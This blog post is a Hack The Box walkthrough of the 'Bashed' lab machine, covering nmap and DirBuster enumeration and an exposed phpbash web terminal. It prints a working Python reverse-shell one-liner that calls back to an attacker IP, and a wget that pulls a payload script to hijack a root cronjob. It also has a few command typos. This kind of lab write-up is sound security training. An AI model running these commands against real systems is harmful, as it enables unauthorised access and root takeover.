---
title: Bashed
date: 2020-05-22 18:59
description: HTB Walkthrough without Metasploit
featured_image: '/images/blog/bashed/bashed.png'
tags: ['Hack The Box']
---

In Bashed, we'll find a hidden directory where we'll have access to a bash terminal through a web browser. We'll use this bash terminal to gain access to the box by creating a reverse shell (x2!) to gain root access, without using Metasploit. So let's get started.

## Hack The Box

* Operating System: Linux 
* Difficulty: Easy

## Enumeration

Enumeration begins with the classic nmap scan.

<img src="/images/blog/bashed/nmapscan.jpg" alt="nmap scan">

	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Arrexel's Development Site

From the results, we know that port 80 is open. So let’s start investigating.

### Website Information 

The first thing we can do is go to the web browser and enter **10.10.10.68**.

<img src="/images/blog/bashed/website.jpg" alt="web page of 10.10.10.68">

After investigating the webpage, it looks like it's some sort of blog that talks about phpbash. Nothing interesting. Checked in the source code and ran Burp Suite, nothing interesting in there either.

The next step is to run DirBuster to see if we can find any hidden directories.

### DirBuster

To run DirBuster, we can type `dirbuster` in the Kali Linux terminal. DirBuster should automatically open. For this scan, I selected the wordlist file: 

**/usr/shared/wordlists/dirbuster/directory-list-2.3-medium.txt**

<img src="/images/blog/bashed/dirbuster.jpg" alt="DirBuster results">

Interestingly, we can see that there's a /dev directory that's available and within it has phpbash.php. Let's go ahead and access that directory within the web browser by typing: 

**http://10.10.10.68/dev/phpbash.php**

Oh, it like we have access to a bash terminal. We can do some more enumerating by typing: 

* `whoami` = prints the userid (currently www-data)
* `uname -a` = prints system information 
* `sudo -l` = tells us what permissions we have

<img src="/images/blog/bashed/phpbash.jpg" alt="bash terminal">

We can see in the second to last line that we can run commands as **scriptmanager** without needing to enter in a password, that might come in handy later.

From the bash terminal we can also navigate throughout the system (FYI, you can find the user.txt file), I navigated to the root directory and found that there was a scripts directory in there--don't usually see a scripts directory in there.

So we can use the `ls -la` command to see a bit more about the file permissions. The image below shows that the user scriptmanager owns and has access to the scripts directory.

<img src="/images/blog/bashed/directory.jpg" alt="scripts directory">

Since we know from above that we can login as scriptmanager, I tried to switch users but it didn't work. In this scenario, since we can't switch users, it means that the bash terminal can only accept one command at a time, so we'll need to complete a reverse shell to gain access.

To gain a reverse shell, we need to find out which code the computer can accept. In this case, I've confirmed that this box accepts python by typing `which python`. This command tells us the location of the executables, and because it printed the path for python, we know that python is installed.

I think we have enough information to exploit the box, so let's give it a try.

## Exploitation

Before we start exploiting the box, let's recap what we found during the enumeration phase:

* In the nmap scan we saw that port 80 was open. 
* After running DirBuster, we found /dev/phpbash.php 
* By typing `sudo -l` we found out that we can log in as scriptmanager. 
* The scriptmanager user has access to a scripts directory. 
* Confirmed that the box can read python. 

Now that we've confirmed the above, let's start the exploitation phase.

### Gaining Reverse Shell

I used [Pentest Monkey's Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to find a python script that we can use. 

Before using it, in a Kali terminal we'll want to start a Netcat listener:  

`nc -lnvp 4444`

And then in the Bash terminal I typed in:

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Success! If we head back to the Kali terminal we should see that we now have a reverse shell.

<img src="/images/blog/bashed/reverseshell.jpg" alt="reverse shell">

Because we're currently logged in as www-data, we can switch users to scriptmanager by typing in:

`sudo -i -u scriptmanager` 

Once we've logged in we can go back to the scripts directory to see what's in there. As a habit, I like to type in `ls -la` to find out more information about the files within the directory.

<img src="/images/blog/bashed/scripts.jpg" alt="scripts directory">

In the image above, we can see that we have read/write access to a **test.py** file. Upon closer inspection, it also looks like the time noted in the **test.txt** increases every minute, so it's likely that the test.txt file is on cronjob to execute the test.py file. We can probably use this to our advantage and complete a privilege escalation to gain root access.

### Privilege Escalation

The first thing I did was create another **test.py** script on the Kali machine but edited it so that it has the script to create a reverse shell using python. 

<img src="/images/blog/bashed/test.jpg" alt="test script">

Before saving, make sure to remember the port number (in the image above, I used 4444) since we will be using it when we create another Netcat listener. 

Next, I created: 

- On Kali machine: `nv -lnvp 4444`
- On Bashed machine: `wget http://10.10.14.31:4444/test.py`

Now if we go into the Bashed terminal, we can see that it downloaded the file.

Afterwards, I removed the old test.py by using the `rm` command and renamed the new file so that it says test.py instead of test.py.1 by using the `mv` command.

Next, in the Kali machine, I created another listener `nc -lnvp 4444` (the same port number mentioned in the script) and waited for the cronjob to run. FYI, you can't run it yourself. You have to wait for the cronjob to complete or else you will not gain root access.

<img src="/images/blog/bashed/root.jpg" alt="root access">

Yes! We did it. To confirm we can type in the `id` command to make sure we have root access.

## Conclusion

If it wasn't obvious, having access to a bash terminal through a webpage is probably not the best way to keep a webpage secure. It was pretty easy to gain a reverse shell and then complete a privilege escalation to gain root access. So, don't have your bash terminals public everyone!